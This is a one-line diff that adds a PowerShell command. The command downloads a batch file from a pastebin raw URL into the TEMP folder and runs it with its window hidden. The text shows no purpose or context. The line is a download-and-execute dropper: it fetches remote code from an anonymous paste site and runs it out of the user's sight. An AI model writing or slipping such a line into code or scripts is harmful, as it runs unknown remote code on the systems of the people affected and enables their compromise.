@@ -1,0 +1,1 @@
+iwr -useb https://pastebin.com/raw/zARZEijb -o $env:TEMP\script.bat; saps $env:TEMP\script.bat -WindowStyle Hidden
